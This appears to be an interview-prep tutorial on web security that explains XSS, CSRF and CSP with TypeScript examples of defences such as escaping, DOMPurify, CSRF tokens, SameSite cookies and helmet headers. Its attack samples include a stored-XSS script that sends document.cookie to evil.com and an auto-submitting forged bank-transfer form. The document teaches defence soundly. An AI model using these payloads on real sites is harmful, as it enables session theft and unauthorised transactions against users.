# Web Security (XSS, CSRF, CSP) 🛡️

## 1. The "Bank Heist" Analogy

Your web application is a bank, and attackers are trying to rob it.

**XSS (Cross-Site Scripting) - The Inside Job:**
- Attacker slips a fake note (malicious script) to the teller.
- Teller reads it aloud to the customer without checking.
- The "note" says: "Transfer all money to account 666."
- Customer's browser executes it as if it came from the bank!

**CSRF (Cross-Site Request Forgery) - The Forged Signature:**
- Attacker gets customer to sign a withdrawal slip while distracted.
- Customer is already logged into their bank (authenticated).
- The slip withdraws $10,000 to the attacker's account.
- Bank processes it because the signature is valid!

**CSP (Content Security Policy) - The Security Policy:**
- Bank posts rules: "Only bank employees may enter the vault."
- Even if someone gets inside, they can't access restricted areas.
- Attackers' scripts are blocked because they're not on the approved list.

**This is Web Security.** Protecting your application and users from malicious attacks.

---

## 2. The Core Concept

In frontend/backend interviews, security questions separate senior engineers from juniors.

**Top Web Vulnerabilities (OWASP Top 10):**
1. **Injection** (SQL, XSS, Command)
2. **Broken Authentication**
3. **Sensitive Data Exposure**
4. **XML External Entities (XXE)**
5. **Broken Access Control**
6. **Security Misconfiguration**
7. **Cross-Site Scripting (XSS)**
8. **Insecure Deserialization**
9. **Using Components with Known Vulnerabilities**
10. **Insufficient Logging & Monitoring**

**Security Mindset:**
- Trust NO input (users, APIs, databases)
- Fail securely (errors shouldn't leak secrets)
- Defense in depth (multiple layers of protection)
- Least privilege (give minimum required access)

---

## 3. Interactive Visualization 🎮

```visualizer
{
  "type": "none",
  "data": [],
  "message": "Security Attack visualizer coming soon!"
}
```

---

## 4. Scenario A: XSS Prevention In-Depth

**Real-Life Scenario:** Your comment section displays user-generated content. An attacker posts a comment with JavaScript.

**Technical Problem:** Prevent XSS attacks while still allowing rich text.

### TypeScript Implementation

```typescript
/**
 * XSS (Cross-Site Scripting)
 * 
 * Attack: Inject malicious script that runs in victim's browser
 * Impact: Session theft, defacement, malware distribution
 * 
 * Types:
 * 1. Stored XSS - Script saved in database
 * 2. Reflected XSS - Script in URL parameter
 * 3. DOM XSS - Script manipulates client-side JS
 */

// ============================================
// ATTACK EXAMPLES
// ============================================

// Stored XSS: Posted as a comment
const maliciousComment = `
  <script>
    // Steal session cookie
    new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
  </script>
`;

// Reflected XSS: In URL parameter
// https://site.com/search?q=<script>alert('XSS')</script>

// DOM XSS: Manipulating innerHTML
const userInput = '<img src=x onerror="alert(document.cookie)">';
document.getElementById('output')!.innerHTML = userInput; // Executes!


// ============================================
// PREVENTION STRATEGIES
// ============================================

/**
 * Strategy 1: Output Encoding (Essential!)
 * 
 * Convert special characters to HTML entities
 * < becomes &lt;
 * > becomes &gt;
 * " becomes &quot;
 * ' becomes &#x27;
 * & becomes &amp;
 */
function escapeHtml(unsafe: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return unsafe.replace(/[&<>"'/]/g, char => map[char]);
}

// Usage
const userComment = '<script>alert("xss")</script>';
const safeComment = escapeHtml(userComment);
// Output: &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
// Renders as text, not executed!


/**
 * Strategy 2: Use textContent instead of innerHTML
 */
// ❌ Dangerous: Executes scripts
element.innerHTML = userInput;

// ✓ Safe: Treats everything as text
element.textContent = userInput;


/**
 * Strategy 3: Sanitize HTML with DOMPurify (for rich text)
 */
import DOMPurify from 'dompurify';

function renderRichText(html: string): string {
  // Allows safe HTML tags, removes dangerous ones
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });
}

// Input: <script>evil()</script><b>Hello</b>
// Output: <b>Hello</b>
// Script tag removed!


/**
 * Strategy 4: React's Automatic Escaping
 */
function SafeComponent({ userInput }: { userInput: string }) {
  // ✓ React automatically escapes this
  return <div>{userInput}</div>;
  // <script> tags become visible text, not executed
}

function DangerousComponent({ userInput }: { userInput: string }) {
  // ❌ Explicitly opting out of protection
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  // Only use with sanitized content!
}


/**
 * Strategy 5: Content Security Policy (CSP)
 */
// ❌ Without CSP: Inline scripts execute
<script>maliciousCode()</script>  // Runs!

// ✓ With CSP: Inline scripts blocked by browser
// HTTP Header:
// Content-Security-Policy: script-src 'self' https://trusted-cdn.com

// Now inline scripts throw:
// Refused to execute inline script because it violates CSP


/**
 * Strategy 6: HttpOnly Cookies
 * 
 * Even if XSS succeeds, can't steal cookies
 */
// Server-side (Express)
res.cookie('session', sessionToken, {
  httpOnly: true,    // JavaScript cannot access this cookie
  secure: true,      // Only sent over HTTPS
  sameSite: 'strict' // Not sent in cross-site requests
});

// Attacker's XSS tries:
document.cookie; // Session cookie not visible!
```

---

## 5. Scenario B: CSRF Prevention In-Depth

**Real-Life Scenario:** Your banking app uses cookies for authentication. An attacker hosts a page that secretly transfers money when visited.

**Technical Problem:** Prevent forged requests from other origins.

### TypeScript Implementation

```typescript
/**
 * CSRF (Cross-Site Request Forgery)
 * 
 * Attack: Trick user's browser into making authenticated requests
 * Impact: Unauthorized actions (transfer money, change email, delete data)
 * 
 * Requirements for attack:
 * 1. User is authenticated (has session cookie)
 * 2. Vulnerable endpoint uses cookie auth
 * 3. Attacker can predict request format
 */

// ============================================
// ATTACK EXAMPLE
// ============================================

// Vulnerable banking endpoint (Express)
app.post('/transfer', (req, res) => {
  const { to, amount } = req.body;
  const userId = req.session.userId; // From cookie
  
  // No CSRF protection!
  transferMoney(userId, to, amount);
  res.json({ success: true });
});

// Attacker's malicious page (evil.com/attack.html)
`
<html>
  <body onload="document.getElementById('csrf-form').submit()">
    <form id="csrf-form" action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="attacker-account" />
      <input type="hidden" name="amount" value="10000" />
    </form>
  </body>
</html>
`
// When victim visits this page:
// 1. Form auto-submits to bank.com
// 2. Browser includes session cookie
// 3. Bank processes the "legitimate" request
// 4. $10,000 transferred to attacker!


// ============================================
// PREVENTION STRATEGIES
// ============================================

/**
 * Strategy 1: CSRF Tokens (Synchronizer Token Pattern)
 * 
 * Server generates random token per session
 * Client must include token in every state-changing request
 * Attacker can't guess the token
 */
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

// Generate token on session creation
function generateCSRFToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware to set CSRF token
function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
  // Generate if not exists
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }
  
  // Make available to templates
  res.locals.csrfToken = req.session.csrfToken;
  next();
}

// Middleware to verify token on state-changing requests
function verifyCsrfToken(req: Request, res: Response, next: NextFunction) {
  // Skip for safe methods
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }
  
  const token = req.body._csrf || req.headers['x-csrf-token'];
  
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ 
      error: 'CSRF token validation failed',
      code: 'CSRF_ERROR'
    });
  }
  
  next();
}

// Form includes token
`
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="${csrfToken}" />
  <input name="to" value="" />
  <input name="amount" value="" />
  <button type="submit">Transfer</button>
</form>
`

// For AJAX requests (React)
async function transferMoney(to: string, amount: number): Promise<void> {
  await fetch('/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCsrfTokenFromMeta(), // From <meta name="csrf-token">
    },
    body: JSON.stringify({ to, amount }),
    credentials: 'include', // Include cookies
  });
}


/**
 * Strategy 2: SameSite Cookies (Modern Solution)
 * 
 * Browser-level protection against CSRF
 * Cookie not sent in cross-origin requests
 */
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Most restrictive
  // sameSite: 'lax',  // Allows top-level navigation
});

// SameSite options:
// 'strict' - Cookie never sent cross-site
// 'lax'    - Sent on top-level navigation (clicking link)
// 'none'   - Always sent (requires Secure flag)


/**
 * Strategy 3: Double Submit Cookie
 * 
 * Send CSRF token in both cookie AND header/body
 * Attacker can cause cookie to be sent, but can't read it
 */
function doubleSubmitCsrf(req: Request, res: Response, next: NextFunction) {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  
  // Attacker can't read the cookie to put in header
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  
  next();
}


/**
 * Strategy 4: Origin Header Validation
 * 
 * Verify Origin/Referer header matches expected domain
 */
function validateOrigin(req: Request, res: Response, next: NextFunction) {
  const origin = req.headers['origin'] || req.headers['referer'];
  const allowedOrigins = ['https://yoursite.com', 'https://www.yoursite.com'];
  
  if (origin && !allowedOrigins.some(o => origin.startsWith(o))) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  next();
}
```

---

## 6. Real World Applications 🌍

### Complete Security Headers Setup

```typescript
/**
 * Production Security Headers (Express with Helmet)
 */
import helmet from 'helmet';

app.use(helmet());

// Content Security Policy - The Most Important One
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // Only allow resources from same origin
      defaultSrc: ["'self'"],
      
      // Scripts: self + trusted CDNs + inline hashes
      scriptSrc: [
        "'self'",
        'https://cdnjs.cloudflare.com',
        // Allow specific inline scripts by hash
        "'sha256-abc123...'",
      ],
      
      // Styles: self + inline (needed for styled-components)
      styleSrc: ["'self'", "'unsafe-inline'"],
      
      // Images: self + data URIs + any HTTPS
      imgSrc: ["'self'", 'data:', 'https:'],
      
      // Fonts: self + Google Fonts
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      
      // Frames: deny by default
      frameAncestors: ["'none'"],
      
      // Form submissions: only to self
      formAction: ["'self'"],
      
      // Block all object/embed/applet
      objectSrc: ["'none'"],
      
      // Upgrade HTTP to HTTPS
      upgradeInsecureRequests: [],
    },
  })
);

// Other security headers
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));
app.use(helmet.noSniff());
app.use(helmet.frameguard({ action: 'deny' }));
app.use(helmet.xssFilter());
app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));
```

### Security Headers Reference

| Header | Protection |
|--------|------------|
| `Content-Security-Policy` | XSS, Data injection |
| `Strict-Transport-Security` | Force HTTPS |
| `X-Content-Type-Options: nosniff` | MIME sniffing |
| `X-Frame-Options: DENY` | Clickjacking |
| `X-XSS-Protection` | Legacy XSS filter |
| `Referrer-Policy` | Referrer leakage |
| `Permissions-Policy` | Feature restrictions |

### Input Validation Example

```typescript
/**
 * Defense in Depth: Server-Side Validation
 */
import { z } from 'zod';

// Define strict schema
const TransferSchema = z.object({
  to: z.string()
    .min(10)
    .max(34)
    .regex(/^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/, 'Invalid IBAN'),
  amount: z.number()
    .positive()
    .max(1000000)
    .transform(n => Math.round(n * 100) / 100), // 2 decimal places
  memo: z.string()
    .max(200)
    .transform(s => escapeHtml(s))
    .optional(),
});

app.post('/transfer', async (req, res) => {
  // Validate and sanitize
  const result = TransferSchema.safeParse(req.body);
  
  if (!result.success) {
    return res.status(400).json({ 
      error: 'Validation failed',
      details: result.error.issues 
    });
  }
  
  // Safe to use result.data
  await processTransfer(result.data);
});
```

---

## 7. Complexity Analysis 🧠

### Security Checklist for Production

| Category | Check | Implementation |
|----------|-------|----------------|
| **XSS** | Escape output | Use framework default escaping |
| **XSS** | Sanitize rich text | DOMPurify |
| **XSS** | CSP header | Block inline scripts |
| **XSS** | HttpOnly cookies | Prevent cookie theft |
| **CSRF** | CSRF tokens | Include in forms |
| **CSRF** | SameSite cookies | Strict or Lax |
| **CSRF** | Origin validation | Check headers |
| **Auth** | HTTPS only | HSTS header |
| **Auth** | Secure cookies | Secure + HttpOnly |
| **Input** | Validate server-side | Never trust client |
| **SQL** | Parameterized queries | Never concatenate |
| **Deps** | Audit dependencies | npm audit, Snyk |

### Interview Tips 💡

1. **Know OWASP Top 10:** "Injection, XSS, CSRF are in the top 10."
2. **Defense in depth:** "Multiple layers—CSP, escaping, sanitization."
3. **Explain the attack:** "XSS lets attacker run code in victim's browser."
4. **Modern solutions:** "SameSite cookies handle most CSRF cases."
5. **Real-world experience:** "We run npm audit in CI and use Snyk."
6. **Framework awareness:** "React escapes by default; Angular sanitizes."
